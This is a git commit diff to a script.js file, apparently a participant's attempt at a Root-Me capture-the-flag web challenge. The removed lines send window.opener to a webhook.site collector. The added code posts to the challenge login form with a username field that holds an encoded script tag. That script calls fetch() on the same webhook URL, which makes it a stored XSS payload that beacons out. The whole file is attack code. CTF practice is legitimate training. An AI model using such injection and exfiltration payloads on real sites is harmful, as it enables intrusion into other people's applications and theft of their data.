523e1d65e59d32fb065216515072182b06a01162
Hanna Nassar <hannanassar1999@gmail.com>
2024-01-25 15:36:54 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,10 @@
-opener= window.opener
-fetch("https://webhook.site/9d69f312-1eda-4197-8591-5716250d09fd?"+opener);
+fetch("http://challenge01.root-me.org:58003/login", {
+  method: "POST",
+  mode: "cors",
+  cache: "no-cache",
+  headers: {
+		"Content-Type": "application/x-www-form-urlencoded"
+  },
+	redirect: "follow",
+	body: "username=%3C%2Fp%3E%3Cscript%3Efetch%28%22https%3A%2F%2Fwebhook.site%2F9d69f312-1eda-4197-8591-5716250d09fd%22%29%3C%2Fscript%3E&password=qweeee"
+})
